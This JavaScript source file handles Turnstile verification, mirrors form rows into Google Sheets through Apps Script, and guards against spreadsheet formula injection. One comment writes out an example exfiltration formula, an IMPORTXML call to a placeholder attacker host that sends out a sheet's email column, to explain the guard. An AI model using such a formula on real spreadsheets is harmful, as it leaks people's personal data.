// Shared outbound integrations: Cloudflare Turnstile and the Google Apps Script
// web apps that mirror rows into Sheets.
//
// Both live here because /api/rsvp and /api/subscribe need identical behaviour
// against different sheets — the only difference is which /exec URL they post to.

export async function verifyTurnstile(env, token, ip) {
  if (!env.TURNSTILE_SECRET) return { ok: true, reason: 'skipped' };
  if (!token) return { ok: false, reason: 'no_token' };
  const form = new FormData();
  form.append('secret', env.TURNSTILE_SECRET);
  form.append('response', token);
  if (ip) form.append('remoteip', ip);
  try {
    const res = await fetch(
      'https://challenges.cloudflare.com/turnstile/v0/siteverify',
      { method: 'POST', body: form }
    );
    const out = await res.json();
    if (out.success) return { ok: true, reason: 'verified' };
    return { ok: false, reason: 'siteverify_failed', codes: out['error-codes'] || [] };
  } catch (e) {
    return { ok: false, reason: 'siteverify_error' };
  }
}

// Neutralize spreadsheet formula injection. Apps Script's appendRow/setValue
// parse a cell starting with =, +, -, @ (or tab/CR) as a LIVE formula, and every
// payload below carries names, emails and notes typed by anyone on the internet.
// A first name of `=IMPORTXML("https://attacker/?d="&TEXTJOIN(",",1,E2:E500),"//a")`
// would otherwise run the next time the owner opened the sheet and mail the
// whole email column out. A leading apostrophe forces Sheets to store text.
// Same guard the CSV export already applies — see functions/api/admin/rsvps.js.
const safeCell = (v) => (typeof v === 'string' && /^[=+\-@\t\r]/.test(v) ? "'" + v : v);

// Posts a payload to an Apps Script web app. Never throws: a Sheet problem must
// not fail the caller's request, because the row is already safe in D1.
export async function postToAppsScript(url, payload, sharedToken) {
  if (!url) return { synced: false, reason: 'no_url' };
  // Every mirror path goes through here — /api/rsvp, /api/subscribe,
  // /api/unsubscribe, admin resync and the admin subscriber edits — so this is
  // the one place the guard has to hold. The shared token is merged in AFTER,
  // untouched: prefixing a secret that happens to start with - or + would
  // silently break auth against the script.
  const safe = {};
  for (const k in payload) safe[k] = safeCell(payload[k]);
  try {
    const res = await fetch(url, {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ ...safe, token: sharedToken || '' }),
    });
    const text = await res.text();
    let out = null;
    try { out = JSON.parse(text); } catch (e) {}
    if (!res.ok) return { synced: false, reason: 'http_' + res.status, snippet: text.slice(0, 140) };
    if (out && out.ok === true) return { synced: true, reason: 'ok' };
    if (out && out.ok === false) return { synced: false, reason: 'script_rejected', error: out.error };
    // Non-JSON body usually means a Google login/redirect page -> web-app
    // access isn't set to "Anyone", or the URL is the /dev not /exec URL.
    return { synced: false, reason: 'non_json_response', snippet: text.slice(0, 140) };
  } catch (e) {
    return { synced: false, reason: 'fetch_error', error: String(e) };
  }
}

// A safe identifier for a configured Apps Script deployment. Never the whole
// URL: it is a capability — anyone holding it can append rows — so we return
// the host, the last path segment, and a short fragment of the deployment id.
// That is useless on its own but enough to (a) spot the two usual
// misconfigurations, a /dev URL instead of /exec or a URL that isn't Apps
// Script at all, and (b) match against the Manage Deployments list, because
// fixing the access setting on the wrong deployment is an easy mistake.
export function fingerprint(url) {
  try {
    const u = new URL(url);
    const parts = u.pathname.split('/').filter(Boolean);
    const tail = parts[parts.length - 1] || '(no path)';
    const id = parts.length >= 3 ? parts[parts.length - 2] : '';
    return {
      endpoint: `${u.host}/…/${tail}`,
      deploymentId: id.length > 12 ? `${id.slice(0, 6)}…${id.slice(-4)}` : id,
    };
  } catch {
    return { endpoint: 'unparseable', deploymentId: '' };
  }
}
